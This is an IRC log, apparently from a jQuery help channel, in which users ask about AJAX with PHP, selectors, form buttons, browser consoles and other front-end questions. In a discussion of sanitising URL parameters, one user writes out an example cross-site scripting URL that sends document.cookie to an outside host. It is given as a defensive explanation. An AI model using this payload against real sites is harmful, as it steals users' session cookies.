[05:11:13] <Dr4g> Hey guys - i got this filter list and looking to group the filters by field name: eg. Last Name (the group) then the sub items of that are contains 'man' and starts with 'an' - http://i51.tinypic.com/zu2yoh.png
[05:11:30] <Dr4g> Had anyone seen good examples of this on the web ?
[05:11:40] <aLinux> i'm talking about json?
[05:12:29] <skamikaze> no you talked bout anyway to pass data from server to client :)
[05:12:34] <skamikaze> aLinux: check dataType
[05:13:46] <aLinux> skamikaze: suppose php got the data from database and it's stored in php variable, now i want to pass that data to jquery function
[05:14:13] <aLinux> skamikaze: does that mean passing data from server to client?
[05:15:17] <emrox> aLinux: if you want to pass this data one time, you can include the data in the normal way (var jsvar = "<?php echo htmlentities($data); ?>"; )
[05:15:28] <fmerges> sean`: code is inside the $(document).ready(...) and I have also functions which are outside global..
[05:15:29] <skamikaze> aLinux: http://php.net/manual/de/function.json-encode.php
[05:15:38] <emrox> aLinux: otherwise you can use ajax (xml/json/whatever)
[05:22:51] <aLinux> skamikaze: what about .getJSON , http://www.adeepersilence.be/archive/jquerys-getjson-with-php
[05:23:56] <skamikaze> well what's the exact case dude?
[05:25:51] <aLinux> skamikaze: making php array to json array and pass it to jquery
[05:26:10] <aLinux> http://www.adeepersilence.be/archive/jquerys-getjson-with-php
[05:27:38] <skamikaze> aLinux: that caches the output by default
[05:27:59] <aLinux> skamikaze: what cache the output by default ?
[05:28:03] <skamikaze> getJSON calls get, that calls ajax
[05:28:13] <skamikaze> and cache is default true
[05:29:30] <aLinux> skamikaze: question is how does .getJSON get the value from php script? $.getJSON('getinfo.php', {'id' : id}, parseInfo);
[05:29:43] <aLinux> skamikaze: http://www.adeepersilence.be/archive/jquerys-getjson-with-php
[05:29:55] <aLinux> skamikaze: look at function parseInfo(data)
[05:30:34] <skamikaze> aLinux: you know what ajax is? or what's the question?
[05:30:36] <skamikaze> don't get you
[05:30:57] <aLinux> skamikaze:     $('#info').html(data.name +', '+ data.email);
[05:31:07] <aLinux> skamikaze: have you read that link i gave you?
[05:31:28] <skamikaze> i know how to use getJSON and what it does
[05:31:29] <skamikaze> :)
[05:31:45] <skamikaze> I don't know where's your problem
[05:32:49] <aLinux> skamikaze:     echo json_encode($users[$id]);   , will this line print json format data ?
[05:33:44] <aLinux> skamikaze: or     echo json_encode($users[$id]);  will it pass the data to function parseInfo(data)
[05:34:01] <aLinux> skamikaze: question is how does function parseInfo(data)  get data ?
[05:34:33] <quicksilver> aLinux: you have a conceptual gap to grasp. The PHP and the jQuery are operating on different machines.
[05:34:46] <quicksilver> you either use PHP to generate a webapge which includes some javascript directly
[05:35:04] <quicksilver> or you get the user's browser to make an AJAX request for a new URL which PHP generates to include the information you want
[05:35:16] <quicksilver> the details of how this works are not the topic of this channel.
[05:35:45] <ravenzz> we only discuss about hot chicks here
[05:36:40] <Germanaz0> hello everybody
[05:36:54] <ravenzz> hello Germanaz0
[05:37:00] <Germanaz0> I would know which is the best jquery ajax uploader, or the one that has best feedback
[05:37:11] <Germanaz0> for singular files, not multiple uploads
[05:38:40] <ravenzz> never used an uploader sorry
[05:39:25] <aLinux> why?
[05:39:37] <Germanaz0> :s
[05:40:50] <jeffsmykil> I can't remember is this allowed?
[05:40:51] <jeffsmykil>  
[05:41:03] <ravenzz> because i haven't uploaders on my previous projects :P?
[05:41:04] <jeffsmykil> if($(".menuContainer").attr('display') == "none")
[05:41:20] <iateadonut> for uploading a single picture and then having the user crop the picture, there's a good one.
[05:41:47] <Germanaz0> yeh
[05:42:12] <ravenzz> jeffsmykil if ($(".menuContainer").is(':hidden'))
[05:42:18] <jeffsmykil> right
[05:42:18] <iateadonut> is that what you're looking for? http://www.webmotionuk.com
[05:42:19] <iateadonut> * "PHP & Jquery image upload & crop"
[05:42:20] <jeffsmykil> thats much better
[05:42:46] <Germanaz0> lemme check :D
[05:43:20] <jeffsmykil> thanks ravenzz
[05:43:34] <ravenzz> np
[05:44:04] <aLinux> http://net.tutsplus.com/tutorials/php/asynchronous-comments-with-jquery-and-json/
[05:44:16] <Germanaz0> iateadonut: there is a portfolio on that site
[05:44:38] <Germanaz0> no uploader :S
[05:44:57] <Germanaz0> http://www.webmotionuk.co.uk/jquery-php-upload-and-crop-feature-request-page/
[05:44:59] <Germanaz0> ahhh
[05:45:01] <Germanaz0> that ?
[05:45:03] <jeffsmykil> ravenzz: i dont understand why its a psuedo class but im just happy it works
[05:46:15] <ravenzz> uhm that's not really a css pseudo-class
[05:46:31] <ravenzz> :hidden is a jQuery selector
[05:47:21] <jeffsmykil> oh ok
[05:47:22] <jeffsmykil> thanks
[05:47:40] <Dbugger> hello guys. ive just made a slider jquery plugin with a function inside called "autoslide( bool  )". Is there a way I can call this function from outside the plugin code?
[05:53:45] <mikunos> hi guys I have a html datagrid with a checkbox in every row. I need to select the checkbox by a click on the row.
[05:53:49] <mikunos> how have I do?
[05:53:57] <mikunos> how have I to do?!
[05:54:03] <Techdeck> hey guys, do you know if in jquery mobile there's built-in functionality for a dynamic list? e.g. when I scroll down it will get the next page automatically and shove it into the list
[05:56:33] <_foobar> If I'm in real need off performance (in animation) what can i use to set the left style in the fastest way. right now I'm using the css function
[05:56:41] <_foobar> ..?
[05:58:49] <veehan> probably object.style.propertyName = "value";
[06:00:58] <_foobar> veehan: is it safe in all major browsers?
[06:01:17] <veehan> i don't see why it wouldn't be, its part of standard javascript
[06:01:18] <_foobar> its native right?
[06:01:25] <_foobar> yeah
[06:01:26] <veehan> http://www.dhtmlkitchen.com/learn/js/setstyle/
[06:01:43] <veehan> =]
[06:02:06] <_foobar> taking for ever to load ZZZzzZZZzz
[06:03:06] <_foobar> veehan: I go by that anyway.. ty
[06:03:15] <veehan> yup, np
[06:05:24] <_foobar> hmm... how do I get the element out off the jquery object?
[06:05:28] <_foobar> ..selector
[06:05:55] <veehan> if you've got the jquery object it would look something like this iirc
[06:06:05] <Defusal_> hi everyone, im really not a designer, so this is pretty annoying, but i need to get my basic layout correct, but i dont know how to get my .ui-icon spans to become inline, instead of always going to the next line... i've tried making them display: block-line, and other things without any luck :(
[06:06:21] <veehan> $('#myId').style.overflow = "hidden";
[06:06:24] <veehan> for example
[06:06:31] <_foobar> iirc?
[06:06:37] <veehan> if i recall correctly
[06:06:45] <skamikaze> Defusal_: float left or display inline-block or by positioning
[06:06:48] <frangio> that won't work
[06:07:09] <_foobar> I just tyed that
[06:07:14] <mazzachre> Hmm... not I have managed to disable the "submit" button when I enter the form, before the data have been validated (via ajax) but when the validation run, I can't reenable the button... I can select it, and change styles (checked to see that selector was right) but setting .attr('disabled', 'false') or 'disabled', undefined does nothing...
[06:07:18] <Defusal_> skamikaze, i dont want to float left, as then it wont be next to my other elements, in the order the markup is written in... inline-block does not work
[06:07:19] <veehan> document.getElementById(myId)
[06:07:21] <mazzachre> How to bring my button back?
[06:07:33] <veehan> that returns the object
[06:07:59] <frangio> veehan: you can do $('#myid/)[0] too if you want to use the jquery selector. it works the same
[06:08:07] <_foobar> veehan:  hehe.. yea but I wont to use the jquery selector
[06:08:19] <veehan> ah =D
[06:08:21] <skamikaze> Defusal_: try positioning by css or use http://jqueryui.com/demos/position/
[06:08:57] <Defusal_> skamikaze, alright thanks
[06:09:00] <veehan> there's your solution _foobar
[06:09:20] <_foobar> veehan: frangio: ty
[06:09:30] <veehan> np
[06:09:36] <frangio> you're welcome
[06:10:19] <aLinux> what's the difference between ("#selector").html().. and ("#selector).text() ?
[06:11:10] <mazzachre> So $('#mybutton').attr('disabled', 'true') disables a button, but $('#mybutton').attr('disabled', 'false') does not enable it... How to enable a button after disabling it?
[06:11:22] <fris> aLinux isnt that obvious?
[06:11:28] <pi3r> hi all
[06:11:34] <frangio> ?html
[06:11:36] <fris> .html treats the content as html .text treats the content as text
[06:11:43] <pi3r> do you know any good jquery plugin to do flash notification ?
[06:11:52] <veehan> aLinux: .html() is the same as .innerHtml
[06:13:33] <aLinux> $.post("Display_Ajax.php",{username: temp1, password: temp2},function(prm){$("div.cls_display").html(prm);});  ,
[06:13:35] <quicksilver> aLinux: which part of the docs for .html() and .text() is unclear?
[06:13:46] <aLinux> what is prm here ? where does this prm get data from ?
[06:13:49] <frangio> maybe he didn't even check the docs...
[06:14:01] <quicksilver> aLinux: check the docs for $.post it's fairly clear.
[06:14:15] <candrea> mazzachre, it's true and false, not 'true' and 'false' (you don't need the quotes)
[06:14:18] <fris> .html will embed the html in the selector, .text will escape the text by replacing element related characters to with their corresponding character entities, so the html will be displayed not rendered
[06:14:29] <candrea> mazzachre, a non-empty string always evaluates to true
[06:14:41] <aLinux> is fris bot ?
[06:14:46] <fris> no
[06:15:07] <fris> im just explaining the difference between the two, which you found have found if you actually visited the docs
[06:15:59] <aLinux> http://api.jquery.com/jQuery.post/
[06:16:21] <aLinux> $.post("test.php", function(data) {
[06:16:22] <aLinux>    alert("Data Loaded: " + data);
[06:16:22] <aLinux>  });
[06:16:34] <aLinux> can't understand where does the data come from?
[06:16:40] <mazzachre> Oh ok... I will try and change that
[06:16:40] <fris> test.php
[06:16:49] <Phil> aLinux, it's the contents of test.php
[06:16:55] <frangio> the data is the response to your POST request
[06:17:13] <Phil> that's a better way to describe it ^^
[06:17:13] <aLinux> from _$POST[ ] ?
[06:17:18] <mazzachre> Ah.. that was better
[06:17:23] <Phil> aLinux, no
[06:17:30] <Phil> if your test.php was as simple as...
[06:17:35] <timing> Hi guys!
[06:17:39] <Phil> <? echo 'hello'; ?>
[06:17:47] <Phil> then data would be "hello"
[06:18:02] <Phil> if your test.php output a load of html, data would be that html
[06:18:44] <buzz_> #drupal
[06:18:56] <Phil> aLinux, think of it as your browser posting to test.php in the background and putting the contents of what you'd normally see in "View Page Source" in the data variable
[06:19:36] <timing> I have code which runs in document.ready: $('.change').each(function(){ /* do something with this .change element */ });. But I also create some .change elements dynamically. How can I then call then trigger that eah thing again?
[06:19:55] <Phil> timing, use .live
[06:20:00] <timing> Phil: it's not an avent
[06:20:03] <timing> *event
[06:20:19] <Phil> oh, I see what you're saying
[06:20:26] <Phil> wrap it in a function and have that call itself
[06:20:26] <timing> Phil: good :-)
[06:20:39] <Phil> just be careful it doesn't end up in a loop - i.e. it has a state where it ends
[06:20:42] <timing> like creating a tiny plugin?
[06:20:45] <timing> ok
[06:23:10] <aLinux> Phil: so you mean data will come from "Html page source" ?
[06:23:25] <aLinux> http://bpaste.net/show/16199/  , suppose this is the test.php file
[06:23:36] <aLinux> then where will the data come from ?
[06:23:42] <aLinux> $.post("test.php", function(data) {
[06:23:52] <aLinux>    alert("Data Loaded: " + data); });
[06:24:00] <aLinux> Phil: ^
[06:24:35] <Phil> aLinux, kinda
[06:24:40] <aLinux> what ?
[06:24:45] <Phil> you're not sending any post data with that
[06:24:53] <Phil> so your test.php will chuck out a load of errors
[06:25:03] <Phil> are you trying to make a form ajax or something?
[06:25:22] <jtmo> Anyone know if I can change data in a portlet (JqueryUI's sortable) when i drag it to a new place?  Like, say i have 4 boxes, a variable in one of the boxes being changed to the current position in line?
[06:25:44] <aLinux> Phil: i can't understand
[06:25:55] <aLinux> Phil: where does the data come from ?
[06:26:01] <aLinux> what is data here?
[06:26:03] <Phil> aLinux, what are you trying to achieve?
[06:26:05] <aLinux> $.post("test.php", function(data) {
[06:26:08] <aLinux>    alert("Data Loaded: " + data); });
[06:26:20] <Phil> as we said, data will be whatever test.php outputs
[06:26:23] <frangio> aLinux: it comes from the response, please do some research on POST and GET requests
[06:26:38] <aLinux> trying to achive , what is data here/
[06:26:50] * Phil gives up
[06:26:54] <frangio> haha
[06:27:20] <aLinux> http://bpaste.net/show/16199/
[06:27:33] <quicksilver> aLinux: this channel is not for explaining the basics of web architecture. You need to go and learn about : PHP, web browsers, web servers, server-side programming, client-side programming, and AJAX.
[06:27:33] <frangio> this is a jquery channel, not a php one
[06:27:35] <aLinux> if this is the test.php then what is data ?
[06:27:36] <aLinux> http://bpaste.net/show/16199/
[06:27:58] <aLinux> $.post("test.php", function(data) { alert("Data Loaded: " + data); });  what is data here?
[06:28:01] <aLinux> if this is the test.php then what is data ?
[06:28:01] <quicksilver> aLinux: of all of those topics I just listed, only client-side programming and AJAX are what this channel is about - and even then, only when they're using jQuery.
[06:28:28] <aLinux> frangio: Phil ^
[06:32:07] <BBonifield> what is everyone using for a time picker these days?
[06:35:47] <Shwaiil> hi ppl
[06:36:50] <mikunos> hi guys why the checkbox object is undefined when I use the .checked method? http://jsfiddle.net/gPmb3/35/
[06:37:04] <mikunos> click on the grid
[06:37:45] <Anitox> i think you wanna use .attr('checked')
[06:38:09] <BBonifield> mikunos: because 'checkbox' is a jQuery collection, not the dom element.  you either need to do checkbox.get(0).checked or checkbox.is(':checked') or checkbox.attr('checked')
[06:38:50] <Shwaiil> Q: I'm using datatables and since the table data comes from .ajax async call, I dont know how to delay a function (that places filters for each column) to happen only when data is available. This function is an anonymous one. This is the code http://pastie.org/1896827 and this is the oficial one http://www.datatables.net/examples/api/multi_filter_select.html documented! Any help is appreciated!
[06:38:57] <frangio> and imo you should go for checkbox.is(':checked')
[06:39:11] <mikunos> perfect Anitox BBonifield ---> THANKS!
[06:39:40] <mikunos> is there a way to intercept the double click by jQuery?
[06:40:06] <frangio> .dblclick() event
[06:40:31] <timing> mikunos: google had a nice answer for you ;-)
[06:40:42] <mikunos> thanks timing
[06:40:43] <BBonifield> Shwaiil: it seems to me that you need to move lines 105-111 into the callback at line 95.
[06:40:48] <frangio> ? dblclick
[06:40:53] <frangio> isn't there a bot in here?
[06:41:03] <quicksilver> mikunos: fixed and slightly improved : http://jsfiddle.net/gPmb3/36/
[06:41:15] <quicksilver> mikunos: (I added some random CSS just so you cane see the class working)
[06:41:16] <Shwaiil> BBonifield, thanks for looking. I'll try that ;)
[06:41:22] <BBonifield> frangio: usually, but bot-t seems to be missing at the moment
[06:41:33] <frangio> oh okay, thanks
[06:41:51] <mikunos> quicksilver really thanks!
[06:41:54] <BBonifield> temp01: where's bot-t?!
[06:42:18] <Shwaiil> BBonifield, in this case, I've got "success" : fnCallback, but there's no fnCallBack defined in this stack. This means that fnCallback exists somewhere else, or I may define it ?
[06:42:26] <Shwaiil> humm i'll console.log
[06:42:53] <Shwaiil> oh yeah fnCallback is not defined
[06:42:55] <aLinux> what's wrong with this code?http://api.jquery.com/jQuery.post/
[06:43:04] <aLinux> it's not working after clicking the button
[06:43:08] <Shwaiil> Ok i'll place it inside a function callback BBonifield tks
[06:43:12] <BBonifield> Shwaiil: it looks like fnCallback is defined as one of the arguments on line 87
[06:45:00] <aLinux> the last code with button
[06:46:13] <aLinux> http://bpaste.net/show/16200/  ,
[06:46:19] <aLinux> it's not working after clicking the button
[06:47:57] <aLinux> http://bpaste.net/show/16200/  ,
[06:47:58] <aLinux> it's not working after clicking the button
[06:48:44] <quicksilver> aLinux: continually reposting the same example isn't going to get you answers. You don't appear to understand the server-side piece of the picture and I don't think y ou're going to get help here.
[06:59:13] <AdvoWork> hi there. Im doing an ajax request to send data to a php file. i have a success function, which is basically do: success:function(html){ alert("OK") ... and i get the OK. but in my php file im doing a mail("....") to test if it works, I never get the mail(if i manually run the page it sends a mail) so it seems like its succeeding but not passing any data. ANy ways I can debug that?
[06:59:19] <aLinux> it's not working after clicking the button
[06:59:23] <aLinux> http://bpaste.net/show/16200/  ,
[06:59:36] <aLinux> nothing is displayed
[07:00:05] <frangio> aLinux: keep trying, it'll work if you concentrate enough
[07:01:19] <aleray> hi, is it possible to make  an ajax request and just get back the header?
[07:01:44] <aLinux> frangio: i don't see any error here ?
[07:02:03] <marekw2143> hi, how to select all child elements of div with id="someDiv" with name="somename"?
[07:02:06] <aLinux> frangio: that example is taken from http://api.jquery.com/jQuery.post/
[07:02:26] <aleray> liek I get when I type "curl -I http://somesite/
[07:02:28] <aleray> "
[07:02:28] <aLinux> http://bpaste.net/show/16200/  ,  can anyone tell where is the error ?
[07:02:39] <quicksilver> marekw2143: $('#someDiv [name=somename]')
[07:02:48] <frangio> aLinux: exactly. and it will only work in that website. write your own examples, please.
[07:02:49] <beepbeep_> Hey all, following selection works in all browsers except google chrome: $('input[stuff*="\"stuff\":morestuff"]'); Does anyone know a solution?
[07:02:53] <quicksilver> or $('#someDiv > [name=somename]')
[07:02:54] <marekw2143> quicksilver: thanks
[07:03:11] <marekw2143> quicksilver: which  option do you recommend?
[07:03:23] <quicksilver> marekw2143: the first is descendants, the second with > is only direct children.
[07:03:28] <quicksilver> (of #someDiv)
[07:03:54] <amh345> hi everyone.  im looking to generate a verticial multi-level dropdown menu.  i've found this one http://www.kriesi.at/wp-content/extra_data/suckerfish_tutorial/step4.html  but im curious to know if there's a defecto one people tend to use?
[07:04:11] <Defusal_> can anyone tell me what the best way would be to disable page highlighting around an element that is being used as a button, so that when clicked multiple times, the page isnt highlighted?
[07:04:28] <aLinux> frangio: can you post an example code ?
[07:04:57] <frangio> Defusal_: what do you mean by page highlighting?
[07:05:32] <Defusal_> frangio, if i use a span as a ui-icon, when clicked the surrounding elements on the page are highlighted
[07:05:35] <aleray> is it possible to do the equivalent of "curl -I" in js/jquery, that is fetching only the header of a resource?
[07:05:51] <beepbeep_> Hey all, following selection works in all browsers except google chrome: $('input[stuff*="\"stuff\":morestuff"]'); Does anyone know a solution?
[07:06:43] <frangio> Defusal_: can you post an example in jsfiddle.net?
[07:07:28] <qom2> http://pastie.org/private/s2b1opqniuglc6jlwfa8q - why can't I have it like this?
[07:07:49] <Defusal_> frangio, i think i fixed it...
[07:07:57] <qom2> I want to be able to structure the code like I did here, but it seems like it's not "ok"
[07:08:18] <Defusal_> by wrapping it in another element, it seems fine now
[07:09:16] <AdvoWork> if ive got var test = "Tue May 10 2011 10:30:00 GMT+0100 (BST)"  how can i post that to a file? i can post information, and am doing: $.post("add-events.php", { title: test, etc etc.. now everything is being passed apart from test. i think its because im not encoding it or something?
[07:14:12] <beepbeep_> Hey all, following selection works in all browsers except google chrome: $('input[stuff*="\"stuff\":morestuff"]'); Does anyone know a solution?
[07:16:55] <larsemil> is it possible to sort a table using jquery? With sort i mean like if first th is name and i want all rows to be sorted according to first letter in column name
[07:17:31] <quicksilver> larsemil: google "jquery sort table"
[07:17:33] <Jon47> larsemil, checkout jquery-ui, there is a sortable interface
[07:17:41] <sero|work> lol you beat me to it, quicksilver
[07:17:46] <sero|work> was getting a LMGTFY
[07:17:49] * iivvoo doesn't understand why his .toggleClass has no effect at all
[07:18:21] <larsemil> http://tablesorter.com/docs/ this one?
[07:19:19] <larsemil> wow this is magic!
[07:19:20] <larsemil> thanks
[07:21:45] <Shwaiil> Q: is there a fast way to sort ["c","a","e","z"] ? Thanks
[07:22:52] <frangio> Shwaiil: http://documentcloud.github.com/underscore/
[07:24:38] <blk_panther> do I need to sanitize url params or can I use this: http://jquery-howto.blogspot.com/2009/09/get-url-parameters-values-with-jquery.html ?
[07:26:28] <Raverix> blk: Both
[07:26:52] <Raverix> Sanitizing prevents bad input, this just gets you the data, you still need to make sure that input is valid.
[07:26:58] <blk_panther> so, where do I need to sanitize it? after I used that script?
[07:27:19] <Raverix> Yes.
[07:27:20] <iivvoo> right.. including jqueryui 1.8.7 disabled toggleClass()
[07:27:22] <iivvoo> odd...
[07:27:43] <beepbeep_> Hey all, following selection works in all browsers except google chrome: $('input[stuff*="\"stuff\":morestuff"]'); Does anyone know a solution?
[07:28:25] <Jon47> blk_panther.. if there's a backend script, why wouldn't you just process the data there, most server-side scripting languages have robust input sanitization features..
[07:28:31] <blk_panther> so, the script is save? or can someone make a url like ex.com/?x=some-bad-js that fucks something up?
[07:29:18] <blk_panther> well, this is js to prevent reloading, so I process the params with the same already written functions
[07:29:38] <blk_panther> I could use php, but then I need to rebuild the whole js thing
[07:30:37] <Raverix> blk_panther: Basic tenant of security... never trust the client.
[07:30:40] <Raverix> Never trust the client.
[07:30:43] <Raverix> Never trust the client.
[07:30:47] <Anitox> what he said
[07:30:48] <Raverix> Read that three times.
[07:30:50] <Jon47> lol Raverix +1
[07:31:09] <Raverix> JavaScript = Client Side scripting, meaning that anything you think you're doing to protect yourself can be undone.
[07:31:37] <Raverix> You're asking about sanitizing your input, which is good, but you MUST do it server side.
[07:32:05] <Raverix> You CAN validate client side, as a convenience,  but then you must validate again server side as well... why"? because you can never trust the client.
[07:32:36] <phlp> unless you work for sony
[07:32:42] <Anitox> lol
[07:32:45] <blk_panther> hmm, my site is this: http://blk-panther.de/fw/guide/Karten/Kalaires Ebene.htm I add the checkboxes and map markers dynamically ... all I want now is mark the checkboxes that are in the params
[07:32:45] <Raverix> lol
[07:32:50] <Jon47> the specific exploit we're concerned with in this case is called script injection or cross-site scriping, if someone can hijack your page to execute arbitrary javascript just by changing some paramter in the URL, that's a vulnerability
[07:33:23] <blk_panther> so this all is clientside, all js ... and still I want to be on the save side (so I asked here, my knowledge is too limited)
[07:34:12] <Raverix> Correct blk_panther, so you need to do this server side. A user submits whatever he's submitting, you sanitize it and out put it with PHP.
[07:34:30] <blk_panther> I thought about this: get the params, check if they match one checkboxname and see it the param is 1 or 0 (true/false, whatever)
[07:34:47] <Jon47> http://blk-panther.de/fw/guide/Karten/Kalaires%20Ebene.html for those who want to click through..
[07:35:02] <blk_panther> hehe, thx
[07:35:23] <Jon47> blk_panther, if you're just checking that it's true or false, it shoudl be really easiy to sanitize
[07:35:29] <Jon47> just do a parseInt on the parameter
[07:36:04] <blk_panther> again, everything there atm is js = clientside
[07:37:28] <Raverix> if EVERYTHING is client side, there's no risk... but I assume at some point your submitting to the server? This is when you must sanitize.
[07:37:53] <blk_panther> there is no serverside involved
[07:38:50] <blk_panther> but xss is clientsided, too, isn't it? (again: limited knowledge about this)
[07:39:41] <beepbeep_> Hey all, following selection works in all browsers except google chrome: $('input[stuff*="\"stuff\":morestuff"]'); Does anyone know a solution?
[07:42:43] <Prot> beepbeep_: what are you trying to do there
[07:42:55] <Prot> with the quotes. thats weird
[07:43:06] <beepbeep_> Prot: I just figured out that it might not be the selection that fails
[07:43:12] <beepbeep_> but the each
[07:43:17] <Prot> ah
[07:43:17] <beepbeep_> which I didn't paste
[07:43:21] <beepbeep_> :P
[07:43:25] <Prot> well just console.log() the set
[07:43:26] <beepbeep_> chrome apperantly hates each()
[07:43:31] <Prot> i doubt that
[07:43:45] <Prot> did you step through the each function?
[07:44:58] <beepbeep_> no console in chrome
[07:44:59] <beepbeep_> :P
[07:45:03] <beepbeep_> the joyz
[07:45:07] <jqp> is it possible to implement XHR streaming/HTTP streaming with jquery?
[07:45:30] <Raverix> Client Side Scripting (XSS) is a category of exploits where malicious user A, posts something to your server, which executes code on user B's computer.
[07:45:40] <Prot> no console in chrome?
[07:45:43] <Prot> how do you figure
[07:45:47] <Prot> its the only browser with a built in console
[07:46:14] <jqp> don't safari and ie8 also have built-in consoles?
[07:46:29] <beepbeep_> re he he healleyyyy?
[07:46:29] <beepbeep_> :)
[07:46:54] <Raverix> Now, if you're doing something like echoing out query vars on your web page via javascript, you also open yourself up to clientside xss.
[07:47:13] <workmad3> Raverix: unless you sanitize them
[07:47:44] <Raverix> For example, I could do: http://yoursite.com/?x=document.location='http://mysite.com?'+document.cookie
[07:48:26] <Raverix> So, what you need to do is make sure that the input is what you expect it to be.
[07:48:31] <Brammm> Sup peeps!
[07:48:34] <oDesk> I've "load()" ed  contents into div layer now the links into that loaded contents opens into the same layer not into the _top of the page
[07:48:35] <test__> hi
[07:48:35] <Brammm> :p
[07:48:43] <Prot> jqp: i've had to install console manually in ie8
[07:48:48] <Prot> safari no idea, never used it
[07:49:03] <test__> is Ben Alman here?
[07:49:06] <Raverix> For example, if you're looking for 'true' or 'false' and you get <script>hackThePlanit()</script>, it's probably indicative that something is wrong.
[07:49:55] <test__> Ben, did you know Blogger is using your BBQ plugin?
[07:50:17] <Brammm> I'm creating an auto suggest box (jquery ui one doesn't fulfill my needs): it's quite rudimentary still, but I've encountered a problem: when my input is blurred, I hide the div. When I click the links in the div (with the suggested options) however, the click isn't caught (I presume because the blur is fired first and the links are actually removed). Any ideas?
[07:50:30] <jqp> Prot: there is a javascript console available by default in ie8.  in 'tools' -> 'developer tools' -> then the 'script' tab
[07:50:44] <Prot> is that a full dev console?
[07:50:51] <Prot> or just an error log javascript console
[07:50:53] <jqp> defined "full dev console"
[07:50:57] <jqp> define*
[07:51:03] <Prot> network monitoring, stepping, watching
[07:51:21] <jqp> watching?
[07:51:37] <Prot> watching code evaluations?
[07:51:55] <brianseeders> 9 has that
[07:51:59] <brianseeders> i dont remember if 8 does
[07:52:04] <Prot> see
[07:52:08] <Prot> i had to install that for 9 to have it
[07:52:13] <Prot> are you sure it has it by default?
[07:52:32] <Prot> i doubt i was simply missing this all these years
[07:52:42] <phlp> ie8 doesnt have network monitoring but it has a console and debugging features
[07:52:59] <Prot> and to be fair, chrome doesn't have it built in, but it does have the option during every install, which is to me the same thing
[07:53:18] <Prot> ie8 has an advanced console tool that has network monitoring and everything else
[07:53:19] <jqp> Prot: the default ie8 javascript console includes the ability to step in code execution and (i believe) watch as variables get assigned values, etc.
[07:53:21] <Prot> but its clunky
[07:53:29] <m0dmd> yo yo yo what's going on everyone
[07:53:33] <Prot> yeah, not really a dev console, just a quick debugger
[07:53:40] <jqp> the default console doesn't include network monitoring
[07:53:49] <Prot> not the likes of firebug, chrome debugger, or the dev tool for ie
[07:54:00] <jqp> and at least in ie8 has poor support for cookie stuff
[07:54:19] <jqp> (but then again firebug doesn't either, without something like the firecookie extension)
[07:54:56] <jqp> Prot: what dev tool for ie are you referring to?
[07:55:05] <Prot> lemme check
[07:55:28] <Prot> doesnt seem to have a name
[07:55:33] <Prot> i hit f12 to bring up a console
[07:55:40] <Prot> looks exactly like chrome/firebug
[07:55:49] <Prot> has browser mode ie7-9 + quirks mode
[07:55:51] <stenno> good day, i have a question about .append(): if i use it like this: $("#pictures").append("<div>1</div>", "<div>2</div>"); it works like a charm, but if i do it like this: $("#pictures").append(["<div>1</div>", "<div>2</div>"]); , ill get a DOM exception error, although in the jquery docs it said that i can use an array as parameter, too...
[07:56:06] <beepbeep_> Prot, good lord, I have found it .. jQuery 1.2 was installed
[07:56:11] <beepbeep_> update fixed it
[07:56:13] <aleray> what is the new crossDomain parameter in the ajax fun? does it mean I could request the HTTP HEAD of a foreign domain resource?
[07:56:43] <jqp> Prot: i use http://www.my-debugbar.com/wiki/IETester/HomePage, which is pretty clunky compared to firebug but includes some basic network monitoring features
[07:56:57] <aLinux> it's not alerting , http://bpaste.net/show/16204/  , can anyone tell why?
[07:56:58] <quicksilver> stenno: the docs are a bit confusing but they don't *actually* say you can pass an array of HTML strings.
[07:57:03] <Prot> whatever I have, its the ms tool
[07:57:24] <quicksilver> stenno: you can pass strings, objects, DOM elements or arrays of DOM elements.
[07:57:28] <quicksilver> stenno: (but not arrays of strings)
[07:57:30] <Prot> http://msdn.microsoft.com/en-us/library/dd565626(v=vs.85).aspx
[07:57:31] <Prot> this
[07:57:35] <Prot> pretty damn useful
[07:57:40] <Prot> just clunky compared to chrome's dev tool
[07:57:45] <Prot> which i feel is the best one
[07:57:46] <stenno> quicksilver, oh i see! i will try it with objects then, thanks!
[08:00:01] <blk_panther> <Raverix> Client Side Scripting (XSS) is a category of exploits where malicious user A, posts something to your server, which executes code on user B's computer. <-- but (whatever this is named) in my case the user a could send b a malicious link (with evil script in the params) ... but I don't know what he can access or archieve with that
[08:00:40] <jqp> this seems like a it could be a misleading statement from the documentation at http://api.jquery.com/jQuery.ajax/: "No onreadystatechange mechanism is provided, however, since success, error, complete and statusCode cover all conceivable requirements."
[08:01:15] <jqp> to my understanding xhr streaming requires a mechanism to detect the onreadystatechange event
[08:01:56] <jqp> see e.g. http://en.wikipedia.org/wiki/Comet_%28programming%29#XMLHttpRequest
[08:02:03] <blk_panther> and if I make a check for param[0] isin ['list', 'thing'] (pseudocode) and a has like ex.com/?a=or 1==1 -- whatever ... dunno if my sanitization can prevent that
[08:02:12] <jqp> and 'Even Faster Websites', page 115
[08:11:09] <freeed> Hey guys... more of a general js question.. anyone using the gmaps geocoder api and trying to batch geocode an array of locations? I'm running into an issue where my batch loop is calling the geocode api too fast. I need to somehow only geocode like 5 locations / second. Looking at some examples for waiting in loops, or using multiple functions with setTimeout.. is there anything simpler to wait in a loop?
[08:12:01] <Wiggin> freed: just use setTimeout?
[08:12:24] <AdvoWork> if ive got var test = "Tue May 10 2011 10:30:00 GMT+0100 (BST)"  how can i post that to a file? i can post information, and am doing: $.post("add-events.php", { title: test, etc etc.. now everything is being passed apart from test. i think its because im not encoding it or something?
[08:12:35] <Wiggin> Alternatively just make the requests one at a time if you don't mind the speed
[08:13:04] <Wiggin> i.e. use recursion
[08:13:13] <freeed> Wiggin, that's what i'm looking at doing.. just isn't very sleek or sexy.. was hoping to find some magical loop/wait implementation :p
[08:13:15] <mysphyt> freeed: I haven't dealt with gmaps specifically, but I dealt with a similar problem by putting all of my operations into an array, and then writing a recursive function that runs the first op in the array, delays, and then calls itself with the remaining array.
[08:13:17] <aLinux> the firefox-web-console doesn't print much info like firebug console , why is this ?
[08:13:44] <Wiggin> yeah i pretty much did what mysphyt did when I was working with gmaps a couple of weeks ago
[08:13:53] <blk_panther> how to check if 'string' is an element of my array?
[08:14:09] <Jon47> freeed, you could make a slightly more sophisticated request queue, and then just pluck off the top 5 requests each time you run through your intervaal
[08:14:31] <Wiggin> i just call the function again when each request completes to do send the next request
[08:14:35] <freeed> Wiggin, the problem i'm running into is if I call setTimeout in a loop, to wait say 1 second.. the loop runs then all my setTimeouts go at once a second later :\
[08:14:37] <mysphyt> freeed: Then if you have to adjust the timeout or whatever, you only have to do it once in the recursive function.  And then you could use setTimeout, and just pass the recursive function as the callback.
[08:14:42] <firebelly> blk_panther: jQuery.inArray( value, array ) http://api.jquery.com/jQuery.inArray/
